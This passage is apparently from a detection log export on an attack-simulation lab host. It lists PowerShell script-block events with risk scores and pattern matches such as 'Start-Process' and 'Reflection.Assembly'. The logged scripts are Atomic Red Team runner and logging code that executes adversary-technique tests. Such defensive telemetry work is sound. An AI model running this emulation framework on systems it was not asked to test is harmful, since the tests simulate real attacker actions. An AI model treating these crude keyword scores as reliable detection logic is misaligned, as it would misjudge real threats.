\"powershell.exe\" }\n    if ($artConfig.debug) { $Arguments = \"-Command Invoke-AtomicRunner *>> $all_log_file\" } else { $Arguments = \"-Command Invoke-AtomicRunner\" }\n    # Invoke the atomic as its own process because we don't want to skip the cleanup and rename process in the event that AV kills the process running the atomic\n    $p1 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru\n\n    if ($artConfig.debug) { $Arguments = \"-Command Invoke-AtomicRunner -scheduledTaskCleanup *>> $all_log_file_cleanup\" } else { $Arguments = \"-Command Invoke-AtomicRunner -scheduledTaskCleanup\" }\n    $p2 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru\n\n    return $p1,$p2\n\n}\n\nfunction LogRunnerMsg ($message) {\n    $mutexName = 'AtomicRunnerLoggingMutex'\n    $mutex = New-Object 'Threading.Mutex' $false, $mutexName\n    # Grab the mutex. Will block until this process has it.\n    $mutex.WaitOne() | Out-Null\n    try {\n        # OK. Now it is safe to write to your log file\n        $now = \"[{0:MM/dd/yy} {0:HH:mm:ss}]\" -f (Get-Date)\n        Write-Host -fore cyan $message\n        Add-Content $artConfig.logFile \"$now`: $message\"\n    }\n    finally {\n        $mutex.ReleaseMutex()\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'Get' matched: 'get-'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.8359273+00:00",
      "event_id": 35711015,
      "risk_score": 2,
      "detected_patterns": ", SuspiciousKeyword, Reflection",
      "pattern_details": "SuspiciousKeyword [Score: 1]; Reflection [Score: 1]",
      "command_length": 831,
      "full_command": "function Load-Assembly {\n    $libDir = Join-Path $here \"lib\"\n    $assemblies = @{\n        \"core\" = Join-Path $libDir \"netstandard2.1\\YamlDotNet.dll\";\n        \"net45\" = Join-Path $libDir \"net45\\YamlDotNet.dll\";\n        \"net35\" = Join-Path $libDir \"net35\\YamlDotNet.dll\";\n    }\n\n    if ($PSVersionTable.Keys -contains \"PSEdition\") {\n        if ($PSVersionTable.PSEdition -eq \"Core\") {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"core\"])\n        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net45\"])\n        } else {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n        }\n    } else { # Powershell 4.0 and lower do not know \"PSEdition\" yet\n        return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
    },
    {
      "timestamp": "2024-12-16T20:34:57.2315053+00:00",
      "event_id": 35711077,
      "risk_score": 2,
      "detected_patterns": ", Get, SuspiciousKeyword",
      "pattern_details": "Get [Score: 1]; SuspiciousKeyword [Score: 1]",
      "command_length": 3188,
      "full_command": "function Invoke-KickoffAtomicRunner {\n\n    #log rotation function\n    function Rotate-Log {\n        Param ($logPath, $max_filesize, $max_age)\n        $datetime = Get-Date -uformat \"%Y-%m-%d-%H%M\"\n\n        $log = Get-Item $logPath\n        if ($log.Length / 1MB -ge $max_filesize) {\n            Write-Host \"file named $($log.name) is bigger than $max_filesize MB\"\n            $newname = \"$($log.Name)_${datetime}.arclog\"\n            Rename-Item $log.PSPath $newname\n            Write-Host \"Done rotating file\"\n        }\n\n        $logdir_content = Get-ChildItem $artConfig.atomicLogsPath -filter \"*.arclog\"\n        $cutoff_date = (get-date).AddDays($max_age)\n        $logdir_content | ForEach-Object {\n            if ($_.LastWriteTime -gt $cutoff_date) {\n                Remove-Item $_\n                Write-Host \"Removed $($_.PSPath)\"\n            }\n        }\n    }\n\n    #Create log files as needed\n    $all_log_file = Join-Path $artConfig.atomicLogsPath \"all-out-$($artConfig.basehostname).txt\"\n    $all_log_file_cleanup = Join-Path $artConfig.atomicLogsPath \"all-out-$($artConfig.basehostname)-cleanup.txt\"\n    New-Item $all_log_file -ItemType file -ErrorAction Ignore\n    New-Item $all_log_file_cleanup -ItemType file -ErrorAction Ignore\n    New-Item $artConfig.logFile -ItemType File -ErrorAction Ignore\n\n    #Rotate logs based on FileSize and Date max_filesize\n    $max_filesize = 200 #in MB\n    $max_file_age = 30 #in days\n    Rotate-Log $all_log_file $max_filesize $max_file_age\n    Rotate-Log $all_log_file_cleanup $max_filesize $max_file_age\n\n    Rotate-Log $artConfig.logFile $max_filesize $max_file_age #no need to repeat this. Can reduce further.\n\n    # Optional additional delay before starting\n    Start-Sleep $artConfig.kickOffDelay.TotalSeconds\n\n    $WorkingDirectory = if ($IsLinux -or $IsMacOS) { \"/tmp\" } else { $env:TEMP }\n    $FileName = if ($IsLinux -or $IsMacOS) { \"pwsh\" } else { \"powershell.exe\" }\n    if ($artConfig.debug) { $Arguments = \"-Command Invoke-AtomicRunner *>> $all_log_file\" } else { $Arguments = \"-Command Invoke-AtomicRunner\" }\n    # Invoke the atomic as its own process because we don't want to skip the cleanup and rename process in the event that AV kills the process running the atomic\n    $p1 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru\n\n    if ($artConfig.debug) { $Arguments = \"-Command Invoke-AtomicRunner -scheduledTaskCleanup *>> $all_log_file_cleanup\" } else { $Arguments = \"-Command Invoke-AtomicRunner -scheduledTaskCleanup\" }\n    $p2 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru\n\n    return $p1,$p2\n\n}\n\nfunction LogRunnerMsg ($message) {\n    $mutexName = 'AtomicRunnerLoggingMutex'\n    $mutex = New-Object 'Threading.Mutex' $false, $mutexName\n    # Grab the mutex. Will block until this process has it.\n    $mutex.WaitOne() | Out-Null\n    try {\n        # OK. Now it is safe to write to your log file\n        $now = \"[{0:MM/dd/yy} {0:HH:mm:ss}]\" -f (Get-Date)\n        Write-Host -fore cyan $message\n        Add-Content $artConfig.logFile \"$now`: $message\"\n    }\n    finally {\n        $mutex.ReleaseMutex()\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'Get' matched: 'get-'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.0064174+00:00",
      "event_id": 35710851,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1359,
      "full_command": "function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n    if (!(Test-Path $logPath)) {\n        New-Item $logPath -Force -ItemType File | Out-Null\n    }\n    $ipAddress = Get-PreferredIPAddress $isWindows\n    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $timeLocal = (Get-Date($startTime) -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $msg = [PSCustomObject][ordered]@{\n        \"Execution Time (UTC)\"   = $timeUTC\n        \"Execution Time (Local)\" = $timeLocal\n        \"Technique\"              = $technique\n        \"Test Number\"            = $testNum\n        \"Test Name\"              = $testName\n        \"Hostname\"               = $targetHostname\n        \"IP Address\"             = $ipAddress\n        \"Username\"               = $targetUser\n        \"GUID\"                   = $testGuid\n        \"ProcessId\"              = $res.ProcessId\n        \"ExitCode\"               = $res.ExitCode\n    }\n\n    $msg | Export-Csv -Path $LogPath -NoTypeInformation -Append\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.4176281+00:00",
      "event_id": 35710552,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 18431,
      "full_command": "function Invoke-AtomicTest {\n    [CmdletBinding(DefaultParameterSetName = 'technique',\n        SupportsShouldProcess = $true,\n        PositionalBinding = $false,\n        ConfirmImpact = 'Medium')]\n    Param(\n        [Parameter(Mandatory = $true,\n            Position = 0,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $AtomicTechnique,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $ShowDetails,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $ShowDetailsBrief,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $anyOS,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String[]]\n        $TestNumbers,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String[]]\n        $TestNames,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String[]]\n        $TestGuids,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String]\n        $PathToAtomicsFolder = $( if ($IsLinux -or $IsMacOS) { $Env:HOME + \"/AtomicRedTeam/atomics\" } else { $env:HOMEDRIVE + \"\\AtomicRedTeam\\atomics\" }),\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $CheckPrereqs = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $PromptForInputArgs = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $GetPrereqs = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $Cleanup = $false,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [switch]\n        $NoExecutionLog = $false,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String]\n        $ExecutionLogPath = $( if ($IsLinux -or $IsMacOS) { \"/tmp/Invoke-AtomicTest-ExecutionLog.csv\" } else { \"$env:TEMP\\Invoke-AtomicTest-ExecutionLog.csv\" }),\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [switch]\n        $Force,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [HashTable]\n        $InputArgs,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [Int]\n        $TimeoutSeconds = 120,\n\n        [Parameter(Mandatory = $false, ParameterSetName = 'technique')]\n        [System.Management.Automation.Runspaces.PSSession[]]$Session,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $Interactive = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $KeepStdOutStdErrFiles = $false,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String]\n        $LoggingModule,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [switch]\n        $SupressPathToAtomicsFolder = $false\n\n    )\n    BEGIN { } # Intentionally left blank and can be removed\n    PROCESS {\n        function ConvertTo-LoggerArray {\n            param (\n                [Parameter(Mandatory = $true)]\n                [string]$Loggers\n            )\n\n            return $Loggers -split ',' | ForEach-Object { $_.Trim() }\n        }\n\n        $PathToAtomicsFolder = (Resolve-Path $PathToAtomicsFolder).Path\n\n        Write-Verbose -Message 'Attempting to run Atomic Techniques'\n        if (-not $supressPathToAtomicsFolder) { Write-Host -ForegroundColor Cyan \"PathToAtomicsFolder = $PathToAtomicsFolder`n\" }\n\n        $executionPlatform, $isElevated, $tmpDir, $executionHostname, $executionUser = Get-TargetInfo $Session\n        $PathToPayloads = if ($Session) { \"$tmpDir`AtomicRedTeam\" }  else { $PathToAtomicsFolder }\n\n        # Since there might a comma(T1559-1,2,3) Powershell takes it as array.\n        # So converting it back to string.\n        if ($AtomicTechnique -is [array]) {\n            $AtomicTechnique = $AtomicTechnique -join \",\"\n        }\n\n        # Splitting Atomic Technique short form into technique and test numbers.\n        $AtomicTechniqueParams = ($AtomicTechnique -split '-')\n        $AtomicTechnique = $AtomicTechniqueParams[0]\n\n        if ($AtomicTechniqueParams.Length -gt 1) {\n            $ShortTestNumbers = $AtomicTechniqueParams[-1]\n        }\n\n        if ($null -eq $TestNumbers -and $null -ne $ShortTestNumbers) {\n            $TestNumbers = $ShortTestNumbers -split ','\n        }\n\n        $isLoggingModuleSet = $false\n        if (-not $NoExecutionLog) {\n            $isLoggingModuleSet = $true\n            if (-not $PSBoundParameters.ContainsKey('LoggingModule')) {\n                # no logging module explicitly set\n                # syslog logger\n                $syslogOptionsSet = [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort\n                if ( $artConfig.LoggingModule -eq \"Syslog-ExecutionLogger\" -or (($artConfig.LoggingModule -eq '') -and $syslogOptionsSet) ) {\n                    if ($syslogOptionsSet) {\n                        $LoggingModule = \"Syslog-ExecutionLogger\"\n                    }\n                    else {\n                        Write-Host -Fore Yellow \"Config.ps1 specified: Syslog-ExecutionLogger, but the syslogServer and syslogPort must be specified. Using the default logger instead\"\n                        $LoggingModule = \"Default-ExecutionLogger\"\n                    }\n                }\n                elseif (-not [bool]$artConfig.LoggingModule) {\n                    # loggingModule is blank (not set), so use the default logger\n                    $LoggingModule = \"Default-ExecutionLogger\"\n                }\n                else {\n                    $LoggingModule = $artConfig.LoggingModule\n                }\n            }\n        }\n\n        if ($isLoggingModuleSet) {\n            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                if (Get-Module -name $_) {\n                    Write-Verbose \"Using Logger: $_\"\n                }\n                else {\n                    Write-Host -Fore Yellow \"Logger not found: \", $_\n                }\n\n                # Change the defult logFile extension from csv to json and add a timestamp if using the Attire-ExecutionLogger\n                if ($_ -eq \"Attire-ExecutionLogger\") { $ExecutionLogPath = $ExecutionLogPath.Replace(\"Invoke-AtomicTest-ExecutionLog.csv\", \"Invoke-AtomicTest-ExecutionLog-timestamp.json\") }\n                $ExecutionLogPath = $ExecutionLogPath.Replace(\"timestamp\", $(Get-Date -UFormat %s))\n\n                if (Get-Command \"$_\\Start-ExecutionLog\" -erroraction silentlycontinue) {\n                    if (Get-Command \"$_\\Write-ExecutionLog\" -erroraction silentlycontinue) {\n                        if (Get-Command \"$_\\Stop-ExecutionLog\" -erroraction silentlycontinue) {\n                            Write-Verbose \"All logging commands found\"\n                        }\n                        else {\n                            Write-Host \"Stop-ExecutionLog not found or loaded from the wrong module\"\n                            return\n                        }\n                    }\n                    else {\n                        Write-Host \"Write-ExecutionLog not found or loaded from the wrong module\"\n                        return\n                    }\n                }\n                else {\n                    Write-Host \"Start-ExecutionLog not found or loaded from the wrong module\"\n                    return\n                }\n            }\n\n            # Here we're rebuilding an equivalent command line to put in the logs\n            $commandLine = \"Invoke-AtomicTest $AtomicTechnique\"\n\n            if ($ShowDetails -ne $false) {\n                $commandLine = \"$commandLine -ShowDetails $ShowDetails\"\n            }\n\n            if ($ShowDetailsBrief -ne $false) {\n                $commandLine = \"$commandLine -ShowDetailsBrief $ShowDetailsBrief\"\n            }\n\n            if ($null -ne $TestNumbers) {\n                $commandLine = \"$commandLine -TestNumbers $TestNumbers\"\n            }\n\n            if ($null -ne $TestNames) {\n                $commandLine = \"$commandLine -TestNames $TestNames\"\n            }\n\n            if ($null -ne $TestGuids) {\n                $commandLine = \"$commandLine -TestGuids $TestGuids\"\n            }\n\n            $commandLine = \"$commandLine -PathToAtomicsFolder $PathToAtomicsFolder\"\n\n            if ($CheckPrereqs -ne $false) {\n                $commandLine = \"$commandLine -CheckPrereqs $CheckPrereqs\"\n            }\n\n            if ($PromptForInputArgs -ne $false) {\n                $commandLine = \"$commandLine -PromptForInputArgs $PromptForInputArgs\"\n            }\n\n            if ($GetPrereqs -ne $false) {\n                $commandLine = \"$commandLine -GetPrereqs $GetPrereqs\"\n            }\n\n            if ($Cleanup -ne $false) {\n                $commandLine = \"$commandLine -Cleanup $Cleanup\"\n            }\n\n            if ($NoExecutionLog -ne $false) {\n                $commandLine = \"$commandLine -NoExecutionLog $NoExecutionLog\"\n            }\n\n            $commandLine = \"$commandLine -ExecutionLogPath $ExecutionLogPath\"\n\n            if ($Force -ne $false) {\n                $commandLine = \"$commandLine -Force $Force\"\n            }\n\n            if ($InputArgs -ne $null) {\n                $commandLine = \"$commandLine -InputArgs $InputArgs\"\n            }\n\n            $commandLine = \"$commandLine -TimeoutSeconds $TimeoutSeconds\"\n            if ($PSBoundParameters.ContainsKey('Session')) {\n                if ( $null -eq $Session ) {\n                    Write-Error \"The provided session is null and cannot be used.\"\n                    continue\n                }\n                else {\n                    $commandLine = \"$commandLine -Session $Session\"\n                }\n            }\n\n            if ($Interactive -ne $false) {\n                $commandLine = \"$commandLine -Interactive $Interactive\"\n            }\n\n            if ($KeepStdOutStdErrFiles -ne $false) {\n                $commandLine = \"$commandLine -KeepStdOutStdErrFiles $KeepStdOutStdErrFiles\"\n            }\n\n            if ($null -ne $LoggingModule) {\n                $commandLine = \"$commandLine -LoggingModule $LoggingModule\"\n            }\n\n            $startTime = Get-Date\n            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                &\"$_\\Start-ExecutionLog\" $startTime $ExecutionLogPath $executionHostname $executionUser $commandLine (-Not($IsLinux -or $IsMacOS))\n            }\n        }\n\n        function Platform-IncludesCloud {\n            $cloud = ('office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')\n            foreach ($platform in $test.supported_platforms) {\n                if ($cloud -contains $platform) {\n                    return $true\n                }\n            }\n            return $false\n        }\n\n        function Test-IncludesTerraform($AT, $testCount) {\n            $AT = $AT.ToUpper()\n            $pathToTerraform = Join-Path $PathToAtomicsFolder \"\\$AT\\src\\$AT-$testCount\\$AT-$testCount.tf\"\n            $cloud = ('iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')\n            foreach ($platform in $test.supported_platforms) {\n                if ($cloud -contains $platform) {\n                    return $(Test-Path -Path $pathToTerraform)\n                }\n            }\n            return $false\n        }\n\n        function Build-TFVars($AT, $testCount, $InputArgs) {\n            $tmpDirPath = Join-Path $PathToAtomicsFolder \"\\$AT\\src\\$AT-$testCount\"\n            if ($InputArgs) {\n                $destinationVarsPath = Join-Path \"$tmpDirPath\" \"terraform.tfvars.json\"\n                $InputArgs | ConvertTo-Json | Out-File -FilePath $destinationVarsPath\n            }\n        }\n\n        function Remove-TerraformFiles($AT, $testCount) {\n            $tmpDirPath = Join-Path $PathToAtomicsFolder \"\\$AT\\src\\$AT-$testCount\"\n            Write-Host $tmpDirPath\n            $tfStateFile = Join-Path $tmpDirPath \"terraform.tfstate\"\n            $tfvarsFile = Join-Path $tmpDirPath \"terraform.tfvars.json\"\n            if ($(Test-Path $tfvarsFile)) {\n                Remove-Item -LiteralPath $tfvarsFile -Force\n            }\n            if ($(Test-Path $tfStateFile)) {\n                (Get-ChildItem -Path $tmpDirPath).Fullname -match \"terraform.tfstate*\" | Remove-Item -Force\n            }\n        }\n\n        function Invoke-AtomicTestSingle ($AT) {\n\n            $AT = $AT.ToUpper()\n            $pathToYaml = Join-Path $PathToAtomicsFolder \"\\$AT\\$AT.yaml\"\n            if (Test-Path -Path $pathToYaml) { $AtomicTechniqueHash = Get-AtomicTechnique -Path $pathToYaml }\n            else {\n                Write-Host -Fore Red \"ERROR: $PathToYaml does not exist`nCheck your Atomic Number and your PathToAtomicsFolder parameter\"\n                return\n            }\n            $techniqueCount = 0\n            $numAtomicsApplicableToPlatform = 0\n            $techniqueString = \"\"\n            foreach ($technique in $AtomicTechniqueHash) {\n                $techniqueString = $technique.attack_technique[0]\n                $techniqueCount++\n\n                $props = @{\n                    Activity        = \"Running $($technique.display_name.ToString()) Technique\"\n                    Status          = 'Progress:'\n                    PercentComplete = ($techniqueCount / ($AtomicTechniqueHash).Count * 100)\n                }\n                Write-Progress @props\n\n                Write-Debug -Message \"Gathering tests for Technique $technique\"\n\n                $testCount = 0\n                foreach ($test in $technique.atomic_tests) {\n\n                    Write-Verbose -Message 'Determining tests for target platform'\n\n                    $testCount++\n\n                    if (-not $anyOS) {\n                        if ( -not $(Platform-IncludesCloud) -and -Not $test.supported_platforms.Contains($executionPlatform) ) {\n                            Write-Verbose -Message \"Unable to run non-$executionPlatform tests\"\n                            continue\n                        }\n\n                        if ( $executionPlatform -eq \"windows\" -and ($test.executor.name -eq \"sh\" -or $test.executor.name -eq \"bash\")) {\n                            Write-Verbose -Message \"Unable to run sh or bash on $executionPlatform\"\n                            continue\n                        }\n                        if ( (\"linux\", \"macos\") -contains $executionPlatform -and $test.executor.name -eq \"command_prompt\") {\n                            Write-Verbose -Message \"Unable to run cmd.exe on $executionPlatform\"\n                            continue\n                        }\n                    }\n\n\n                    if ($null -ne $TestNumbers) {\n                        if (-Not ($TestNumbers -contains $testCount) ) { continue }\n                    }\n\n                    if ($null -ne $TestNames) {\n                        if (-Not ($TestNames -contains $test.name) ) { continue }\n                    }\n\n                    if ($null -ne $TestGuids) {\n                        if (-Not ($TestGuids -contains $test.auto_generated_guid) ) { continue }\n                    }\n\n                    $props = @{\n                        Activity        = 'Running Atomic Tests'\n                        Status          = 'Progress:'\n                        PercentComplete = ($testCount / ($technique.atomic_tests).Count * 100)\n                    }\n                    Write-Progress @props\n\n                    Write-Verbose -Message 'Determining manual tests'\n\n                    if ($test.executor.name.Contains('manual')) {\n                        Write-Verbose -Message 'Unable to run manual tests'\n                        continue\n                    }\n                    $numAtomicsApplicableToPlatform++\n\n                    $testId = \"$AT-$testCount $($test.name)\"\n                    if ($ShowDetailsBrief) {\n                        Write-KeyValue $testId\n                        continue\n                    }\n\n                    if ($PromptForInputArgs) {\n                        $InputArgs = Invoke-PromptForInputArgs $test.input_arguments\n                    }\n\n                    if ($ShowDetails) {\n                        Show-Details $test $testCount $technique $InputArgs $PathToPayloads\n                        continue\n                    }\n\n                    Write-Debug -Message 'Gathering final Atomic test command'\n\n\n                    if ($CheckPrereqs) {\n                        Write-KeyValue \"CheckPrereq's for: \" $testId\n                        $failureReasons = Invoke-CheckPrereqs $test $isElevated $executionPlatform $InputArgs $PathToPayloads $TimeoutSeconds $session\n                        Write-PrereqResults $FailureReasons $testId\n                    }\n                    elseif ($GetPrereqs) {\n                        if ($(Test-IncludesTerraform $AT $testCount)) {\n                            Build-TFVars $AT $testCount $InputArgs\n                        }\n                        Write-KeyValue \"GetPrereq's for: \" $testId\n                        if ( $test.executor.elevation_required -and -not $isElevated) {\n                            Write-Host -ForegroundColor Red \"Elevation required but not provided\"\n                        }\n                        if ($nul -eq $test.dependencies) { Write-KeyValue \"No Preqs Defined\"; continue }\n                        foreach ($dep in $test.dependencies) {\n                            $executor = Get-Prereq",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 2,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.4176444+00:00",
      "event_id": 35710553,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 5827,
      "full_command": "Executor $test\n                            $description = (Merge-InputArgs $dep.description $test $InputArgs $PathToPayloads).trim()\n                            Write-KeyValue  \"Attempting to satisfy prereq: \" $description\n                            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $InputArgs $PathToPayloads\n                            if ($executor -ne \"powershell\") { $final_command_prereq = ($final_command_prereq.trim()).Replace(\"`n\", \" && \") }\n                            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $InputArgs $PathToPayloads\n                            $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true\n\n                            if ($res.ExitCode -eq 0) {\n                                Write-KeyValue \"Prereq already met: \" $description\n                            }\n                            else {\n                                $res = Invoke-ExecuteCommand $final_command_get_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive\n                                $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true\n                                if ($res.ExitCode -eq 0) {\n                                    Write-KeyValue \"Prereq successfully met: \" $description\n                                }\n                                else {\n                                    Write-Host -ForegroundColor Red \"Failed to meet prereq: $description\"\n                                }\n                            }\n                        }\n                    }\n                    elseif ($Cleanup) {\n                        Write-KeyValue \"Executing cleanup for test: \" $testId\n                        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $InputArgs $PathToPayloads\n                        if (Get-Command 'Invoke-ARTPreAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicCleanupHook $test $InputArgs }\n                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive\n                        Write-KeyValue \"Done executing cleanup for test: \" $testId\n                        if (Get-Command 'Invoke-ARTPostAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicCleanupHook $test $InputArgs }\n                        if ($(Test-IncludesTerraform $AT $testCount)) {\n                            Remove-TerraformFiles $AT $testCount\n                        }\n                    }\n                    else {\n                        Write-KeyValue \"Executing test: \" $testId\n                        $startTime = Get-Date\n                        $final_command = Merge-InputArgs $test.executor.command $test $InputArgs $PathToPayloads\n                        if (Get-Command 'Invoke-ARTPreAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicHook $test $InputArgs }\n                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive\n                        Write-Host \"Exit code: $($res.ExitCode)\"\n                        if (Get-Command 'Invoke-ARTPostAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicHook $test $InputArgs }\n                        $stopTime = Get-Date\n                        if ($isLoggingModuleSet) {\n                            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                                &\"$_\\Write-ExecutionLog\" $startTime $stopTime $AT $testCount $test.name $test.auto_generated_guid $test.executor.name $test.description $final_command $ExecutionLogPath $executionHostname $executionUser $res (-Not($IsLinux -or $IsMacOS))\n                            }\n                        }\n                        Write-KeyValue \"Done executing test: \" $testId\n                    }\n\n                } # End of foreach Test in single Atomic Technique\n            } # End of foreach Technique in Atomic Tests\n            if ($numAtomicsApplicableToPlatform -eq 0) {\n                Write-Host -ForegroundColor Yellow \"Found $numAtomicsApplicableToPlatform atomic tests applicable to $executionPlatform platform for Technique $techniqueString\"\n            }\n        } # End of Invoke-AtomicTestSingle function\n\n        if ($AtomicTechnique -eq \"All\") {\n            function Invoke-AllTests() {\n                $AllAtomicTests = New-Object System.Collections.ArrayList\n                Get-ChildItem $PathToAtomicsFolder -Directory -Filter T* | ForEach-Object {\n                    $currentTechnique = [System.IO.Path]::GetFileName($_.FullName)\n                    if ( $currentTechnique -match \"T[0-9]{4}.?([0-9]{3})?\" ) { $AllAtomicTests.Add($currentTechnique) | Out-Null }\n                }\n                $AllAtomicTests.GetEnumerator() | Foreach-Object { Invoke-AtomicTestSingle $_ }\n            }\n\n            if ( ($Force -or $CheckPrereqs -or $ShowDetails -or $ShowDetailsBrief -or $GetPrereqs) -or $psCmdlet.ShouldContinue( 'Do you wish to execute all tests?',\n                    \"Highway to the danger zone, Executing All Atomic Tests!\" ) ) {\n                Invoke-AllTests\n            }\n        }\n        else {\n            Invoke-AtomicTestSingle $AtomicTechnique\n        }\n\n        if ($isLoggingModuleSet) {\n            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                &\"$_\\Stop-ExecutionLog\" $startTime $ExecutionLogPath $executionHostname $executionUser (-Not($IsLinux -or $IsMacOS))\n            }\n        }\n\n    } # End of PROCESS block\n    END { } # Intentionally left blank and can be removed\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 2,
      "message_total": 2,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.2018207+00:00",
      "event_id": 35711056,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 10667,
